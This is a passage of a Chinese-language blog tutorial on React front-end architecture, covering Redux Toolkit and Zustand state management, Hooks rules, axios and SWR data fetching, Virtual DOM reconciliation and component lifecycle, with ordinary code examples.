class="string">&quot;@reduxjs/toolkit&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> initialState = &#123; <span class="attr">value</span>: <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> counterSlice = <span class="title function_">createSlice</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;counter&quot;</span>,</span><br><span class="line">  initialState,</span><br><span class="line">  <span class="attr">reducers</span>: &#123;</span><br><span class="line">    <span class="title function_">increment</span>(<span class="params">state</span>) &#123;</span><br><span class="line">      state.<span class="property">value</span>++;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">decrement</span>(<span class="params">state</span>) &#123;</span><br><span class="line">      state.<span class="property">value</span>--;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">incrementByAmount</span>(<span class="params">state, action</span>) &#123;</span><br><span class="line">      state.<span class="property">value</span> += action.<span class="property">payload</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> &#123; increment, decrement, incrementByAmount &#125; = counterSlice.<span class="property">actions</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> counterSlice.<span class="property">reducer</span>;</span><br></pre></td></tr></table></figure><p>以程式碼的架構面來說，使用 Redux 是一個重大的決定，從寫法上看來幾乎是穿透了專案所有地方，從 GUI 上的 Action 需要透過特殊的方式 Dispatch 一直到打 API 的 middleware 一直到 Global 的 Store，所以也才演變出 Container 和 Component 的概念，還是盡量讓元件是可以高度重用的設計。</p><h3 id="Store-Zustand"><a href="#Store-Zustand" class="headerlink" title="Store: Zustand"></a>Store: Zustand</h3><p>隨著時間的演進，最近有越來越多管理狀態的工具，以概念上來說粗分為三種流派 Atom、Store、Proxy，如果以最傳統的 Store 概念來說，Zustand 是小編目前用過最簡單的，最基本的 store 只要短短幾行就完成配置，如果想要看看小編的推坑文，歡迎繼續閱讀<a href="https://linyencheng.github.io/2024/10/02/react/react-store-zustand/">為什麼選擇 Zustand 作為最佳狀態管理解決方案</a>這篇文章。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; create &#125; <span class="keyword">from</span> <span class="string">&quot;zustand&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> useStore = <span class="title function_">create</span>(<span class="function">(<span class="params">set</span>) =&gt;</span> (&#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">inc</span>: <span class="function">() =&gt;</span> <span class="title function_">set</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> (&#123; <span class="attr">count</span>: state.<span class="property">count</span> + <span class="number">1</span> &#125;)),</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>程式碼架構上來說，因為是使用 hook 的關係，所以剩下只需要在元件中透過 hook 的概念將 Store 掛載進去元件進行使用即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Counter</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; count, inc &#125; = <span class="title function_">useStore</span>();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;count&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;inc&#125;</span>&gt;</span>one up<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在專案架構上 Zustand 除了 hook 以外也提供了不同的架構方式，不使用 hook 而透過直接當模組使用的方式也讓元件的呈現能更為簡潔。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> useDogStore = <span class="title function_">create</span>(<span class="function">() =&gt;</span> (&#123; <span class="attr">paw</span>: <span class="literal">true</span>, <span class="attr">snout</span>: <span class="literal">true</span>, <span class="attr">fur</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Getting non-reactive fresh state</span></span><br><span class="line"><span class="keyword">const</span> paw = useDogStore.<span class="title function_">getState</span>().<span class="property">paw</span>;</span><br><span class="line"><span class="comment">// Listening to all changes, fires synchronously on every change</span></span><br><span class="line"><span class="keyword">const</span> unsub1 = useDogStore.<span class="title function_">subscribe</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br><span class="line"><span class="comment">// Updating state, will trigger listeners</span></span><br><span class="line">useDogStore.<span class="title function_">setState</span>(&#123; <span class="attr">paw</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"><span class="comment">// Unsubscribe listeners</span></span><br><span class="line"><span class="title function_">unsub1</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// You can of course use the hook as you always would</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Component</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> paw = <span class="title function_">useDogStore</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> state.<span class="property">paw</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="業務邏輯層-React-Hooks"><a href="#業務邏輯層-React-Hooks" class="headerlink" title="業務邏輯層: React Hooks"></a>業務邏輯層: React Hooks</h2><p><a href="https://linyencheng.github.io/2024/08/17/react/react-hooks/">為什麼要選擇 React Hooks?</a></p><blockquote><p>React Hooks 提供了一種更簡潔、更靈活的方式來管理狀態和副作用，使開發人員能夠更專注於業務邏輯的實現</p></blockquote><p>React Hooks 的出現是 Reactjs 發展史上的重要里程碑，讓副作用處理和加值功能能透過 hook 的方式整合進 functional component，相對 class 的處理能提供更簡單的寫法，像 redux 的 useSelector 就取代 connect 和 mapStateToProps。</p><p>React Hooks 的概念可以想像成是在登山背包上，透過外掛系統將需要的功能或需要的材料掛載到背包上，透過 hooks 將邏輯處理的函式和處理後的資料掛載到元件上。</p><blockquote><p><img src="https://pic2.zhimg.com/v2-33eb45debc551d28d565ad31d3b59599_b.webp?consumer=ZHI_MENG"><br>圖片來源: <a href="https://www.zhihu.com/tardis/zm/art/456354561?source_id=1003">https://www.zhihu.com/tardis/zm/art/456354561?source_id=1003</a></p></blockquote><p>React Hooks 由剛剛的說明來看就屬於外掛子系統的一個概念，所以在撰寫上也有要注意的規範</p><ol><li>只能在 function 中的最上層使用 hooks，不要在迴圈中或是判斷裡面執行，外掛系統必須跟著元件在產生的時候一起掛載上去，就像是登山背包出門發前就要將裝備準備齊全一樣</li><li>只能在 React Function 裡面使用 hooks 不能在一般的 JavaScript Function 中使用，因為 hooks 是專屬於 React 元件的外掛系統，就是像都已經出門登山了外掛的東西在半山腰突然修改一樣</li><li>不要動態的修改 hooks 的內容，外掛系統也是一個系統不要邊使用邊改變</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 只能掛載在最上層，且一開始就使用，而不是當作半路上的選配</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ChatInput</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Button</span> <span class="attr">useData</span>=<span class="string">&#123;useDataWithLogging&#125;</span> /&gt;</span></span>; <span class="comment">// 🔴 Bad: don&#x27;t pass Hooks as props</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 不要動態的修改 hooks 的內容，外掛系統也是一個系統不要邊使用邊改變</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ChatInput</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> useDataWithLogging = <span class="title function_">withLogging</span>(useData); <span class="comment">// 🔴 Bad: don&#x27;t write higher order Hooks</span></span><br><span class="line">  <span class="keyword">const</span> data = <span class="title function_">useDataWithLogging</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="API-Hooks-SWR、React-Query"><a href="#API-Hooks-SWR、React-Query" class="headerlink" title="API Hooks: SWR、React Query"></a>API Hooks: SWR、React Query</h3><p>舉個例子來說與後端 API 介面整合的部分，早期的寫法小編大多是透過定義 API Service 來進行處理。</p><p>在 Fetch 尚未普及時，Axios API 提供了一個不錯的解決方案，打 API 的時候，可能常常不只一個後端，不同後端也會需要有兩個不同的 token，放置的位置可能也不一樣，成功回覆的狀態碼也不同，失敗的情況也不大相同。所以如果當多個地方都需要同時打 A、B 兩個不同的 API 時，也代表多個地方都要進行類似的預&#x2F;後處理。</p><p>那 <a href="https://github.com/axios/axios">axios</a> 透過產生 instance 的方式，幫我們統一處理了 request 發出前，接收 response 後，統一的預處理、後處理的問題。這樣只要在不同的地方使用 A、B instance 去進行 API 的串接即可。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> A = axios.<span class="title function_">create</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add a request interceptor</span></span><br><span class="line">A.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">config</span>) &#123;</span><br><span class="line">    <span class="comment">// Do something before request is sent</span></span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">error</span>) &#123;</span><br><span class="line">    <span class="comment">// Do something with request error</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add a response interceptor</span></span><br><span class="line">A.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">    <span class="comment">// Do something with response data</span></span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">error</span>) &#123;</span><br><span class="line">    <span class="comment">// Do something with response error</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">A.<span class="title function_">get</span>(<span class="string">&quot;/api/path&quot;</span>);</span><br></pre></td></tr></table></figure><p>SWR 與 React Query 則提供了 hook 的解決方案，對於 API 資料的處理寫法上簡化了不少。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> useSWR <span class="keyword">from</span> <span class="string">&quot;swr&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fetcher</span> = (<span class="params">url</span>) =&gt; axios.<span class="title function_">get</span>(url).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="property">data</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Profile</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; data, error, isLoading &#125; = <span class="title function_">useSWR</span>(<span class="string">&quot;/api/user&quot;</span>, fetcher);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (error) <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>failed to load<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (isLoading) <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>loading...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello &#123;data.name&#125;!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>早期 API services 的設計在 hook 則透過客製化不同的 fetcher 來進行轉換，fetcher 依舊可以維持原來的作法，只是在元件中我們不再透過 <code>useEffect</code> 和 <code>useState</code> 來處理資料。</p><h2 id="展示層-JSX、CSS-in-JS"><a href="#展示層-JSX、CSS-in-JS" class="headerlink" title="展示層: JSX、CSS-in-JS"></a>展示層: JSX、CSS-in-JS</h2><p>Reactjs 使用 JSX 語法來描述 UI 界面，使其更易於理解和維護。</p><blockquote><p>DOM &#x3D; React(props, state)</p></blockquote><p>元件中的 JSX 會透過 <a href="https://react.dev/reference/react/createElement">createElement</a> 這個 function 被轉換成 React Element。</p><h3 id="Reconciliation-Virtual-DOM、Fiber-Tree"><a href="#Reconciliation-Virtual-DOM、Fiber-Tree" class="headerlink" title="Reconciliation: Virtual DOM、Fiber Tree"></a>Reconciliation: Virtual DOM、Fiber Tree</h3><p><a href="https://zh-hant.reactjs.org/blog/2015/12/18/react-components-elements-and-instances.html">React Element</a> 是一個物件，包含 type 及 properties，type 用來區分是 component instance 或是 DOM node，Element 在 React 中又分成兩種</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. Element (type 為 DOM node)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&#x27;button&#x27;</span>,</span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">className</span>: <span class="string">&#x27;button button-blue&#x27;</span>,</span><br><span class="line">    <span class="attr">children</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">      <span class="attr">props</span>: &#123;</span><br><span class="line">        <span class="attr">children</span>: <span class="string">&#x27;OK!&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;button <span class="keyword">class</span>=<span class="string">&#x27;button button-blue&#x27;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    OK!</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">&lt;/button&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. Component Element (type 為 instance)</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">DeleteAccount</span> = (<span class="params"></span>) =&gt; (&#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="title class_">SubmitForm</span>,</span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">children</span>: [&#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">      <span class="attr">props</span>: &#123;</span><br><span class="line">        <span class="attr">children</span>: <span class="string">&#x27;Are you sure?&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">Button</span>,</span><br><span class="line">      <span class="attr">props</span>: &#123;</span><br><span class="line">        <span class="attr">color</span>: <span class="string">&#x27;blue&#x27;</span>,</span><br><span class="line">        <span class="attr">children</span>: <span class="string">&#x27;Cancel&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;]</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">DeleteAccount</span> = (<span class="params"></span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">SubmitForm</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Are you sure?<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Button</span> <span class="attr">color</span>=<span class="string">&#x27;blue&#x27;</span>&gt;</span>Cancel<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">SubmitForm</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>當我們知道底層的定義之後，React 透過 Virtual DOM 減少了高成本的 DOM tree 操作，可以參考 <a href="https://grfia.dlsi.ua.es/ml/algorithms/references/editsurvey_bille.pdf">state of the art algorithms</a>，React 效能好就歸功於寫的程式碼並不會操作 DOM，而是會有以下特性:</p><ul><li>改變的狀態其實是操作我們常聽到的 Virtual DOM 或是 Fiber Tree</li><li>狀態對 UI 影響是<em>非同步</em>，如果狀態在一個循環內 <code>A -&gt; B -&gt; C -&gt; A</code> 這樣最後 DOM 就不會變化</li><li>相同 type，如果 attributes 改變則會偵測並變化 attribute</li><li>Reconciliation (fiber) 將複雜度減少到 O(n)</li></ul><p>React 也會這樣的資料結構中，處理狀態對於元件的改變，這個結構就是我們常聽的 Virtual DOM，有篇開箱文寫的很棒:</p><p><a href="https://pomb.us/build-your-own-react/">https://pomb.us/build-your-own-react/</a></p><p>在這篇文章中可以看成是一棵 <a href="https://en.wikipedia.org/wiki/Left-child_right-sibling_binary_tree">left-chlid right-sibling tree</a>:</p><ul><li>每一個 Node 有指向 Parent 的參考</li><li>過程先看有沒有 Child，再看有沒有 Sibling，都沒有才回到 Parent</li><li>整棵樹走完才 render 結果到實際的 DOM 上</li></ul><p>Reconciliation 就是一個演算法，找出哪些樹節點哪些需要變化，當我們呼叫 <code>render()</code> 的時候，React 會做一個 Top-Down 的 Reconciliation。</p><p>過程中會不停地去問你的 type 是什麼? 如果我們定義了一個 Component Elements X 且 type 是 Y，那 React 就會去問什麼是 Y，直到問到最基礎的組成為止。</p><p>Reconciliation 實作上會符合以下假設:</p><ul><li>不同 type，在 react 會產生不同的樹，不會去偵測而是直接取代</li><li>偵測一個 list 的改變會透過 keys 來增加效能</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&quot;2015&quot;</span>&gt;</span>Duke<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&quot;2016&quot;</span>&gt;</span>Villanova<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&quot;2014&quot;</span>&gt;</span>Connecticut<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&quot;2015&quot;</span>&gt;</span>Duke<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&quot;2016&quot;</span>&gt;</span>Villanova<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="元件分類與週期-React-Class-Component、Functional-Component"><a href="#元件分類與週期-React-Class-Component、Functional-Component" class="headerlink" title="元件分類與週期: React Class Component、Functional Component"></a>元件分類與週期: React Class Component、Functional Component</h3><p>實際上元件中週期有哪些? 執行順序如何? 就像人有生老病死，元件從出現到消失主要也分三部分</p><blockquote><p>Mount -&gt; Updating -&gt; Unmounting</p></blockquote><p>React 要寫出一個元件，有 Class-based 或是 Functional 兩種方式，早期的 React Class Component 開發參雜了各種複雜的元件週期，也許是因為開發初期，所以將週期都拆解得很詳細，並且提供可以客製的型態，光是理解這些就讓開發的入門門檻提高不少。</p><ol><li>Mount: 已經出現在瀏覽器的 DOM 上<ul><li><code>constructor()</code></li><li><code>static getDerivedStateFromProps()</code></li><li><code>render()</code></li><li><code>componentDidMount()</code></li></ul></li><li>Updating: Props 或 State 變化後引發的元件更新<ul><li><code>getDerivedStateFromProps()</code></li><li><code>shouldComponentUpdate()</code></li><li><code>render()</code></li><li><code>getSnapshotBeforeUpdate()</code></li><li><code>componentDidUpdate()</code></li></ul></li><li>Unmounting: 從瀏覽器的 DOM 中移除<ul><li><code>componentWillUnmount()</code></li></ul></li></ol><p>另外元件從 Props 或 State 變化後引發改變的過程，主要分為兩大階段 Render 和 Commit，會先進行 Render 的計算後才會真的 Commit 結果到真正的 DOM 上面，Commit 前會有個 Pre-commit。</p><ol><li>Render: 在這個階段 React 能自行暫停、取消、重新這個過程</li><li>Pre-commit: 文件上有出現但甚少使用的功能，有一個週期是 <code>getSnapshotBeforeUpdate()</code>，可以看成是一個做決定前的再次狀態確認</li><li>Commit: 套用改變到瀏覽器的 DOM 上，而這是肉眼可見，也是我們較常操作的週期<ol><li><code>componentDidMount()</code>: Mount 成功，出現在 DOM 上面</li><li><code>componentDidUpdate()</code>: Props 或 State 改變</li><li><code>componentWillUnmount()</code>: 從 DOM 上移除</li></ol></li></ol><iframe width="100%" height="550" src="https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><p>React 經過十年後，現在常見的 Functional Component 已經不再需要處理複雜的元件週期，取而代之的是理解關鍵元件週期並透過 hook 處理，當元件 props 或是 state 改變後，React 會透過 render 的演算法來決定最終要更新到 DOM 上面的改變，這個過程就是剛剛提到的 reconciliation。</p><p>雖然說透過 hook 能大量簡化元件本身的規則，但元件還是有一些基礎原則需要遵守一些原則來設計:</p><ol><li>冪等 (Idempotent): 這部分跟 API 設計一樣，React Funtional Component 本質上也還是一個 Function，所以將元件設計為 Pure Function 且保證每次的 Input 也就是 State 和 Props 不改的情況下，每次都要 Render 出同樣的結果</li><li>不在 Render 的地方處理 Side Effect: 元件本身可以看成一個 Declarative 的語言，理論上我們想要出現什麼就是什麼，React 只優化狀態改變後的 “下個版本” 該顯示什麼該怎麼改變畫面，會出現副作用讓畫面不同的地方通常只剩使用者操作事件或是後端 API 的資料不符合 Idempotent，當 Render 元件這件事變成純函式，React 也可以更容易的去優化</li><li>不去修改非元件內的資料: Props 跟 state 都是 immutable 也就是不要造成額外副作用的意思</li><li>元件用 JSX 的方式執行: 雖然 Functional Component 可以當成 Function 直接執行 <code>HelloComponent()</code>，但你會發現 React 開發者工具就無法處理 AKA React 並沒有辦法好好處理，建議方式還是 <code>&lt;HelloComponent /&gt;</code> 讓 React 正常執行上面提到的 createElement 產生正確的 Virtual Dom</li><li>元件裡面不要再有元件: 會讓元件檔案變大也很難做完全隔離的單元測試，這種寫法大概只能存在於重構到一半的程式碼</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad: 元件只用 JSX 的方式執行</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ComponentOne</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ComponentOne</span>&gt;</span><span class="tag">&lt;/<span class="name">ComponentOne</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;() =&gt; &#123;return <span class="tag">&lt;&gt;</span>ComponentTwo<span class="tag">&lt;/&gt;</span></span>;&#125;()&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ComponentOne</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">ComponentTwo</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;&gt;</span>ComponentTwo<span class="tag">&lt;/&gt;</span></span>;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ComponentOne</span>&gt;</span><span class="tag">&lt;/<span class="name">ComponentOne</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;ComponentTwo()&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Bad: 元件裡面不要再有元件</span></span><br><span class="line"><span class="keyword">function</span> <span class="title 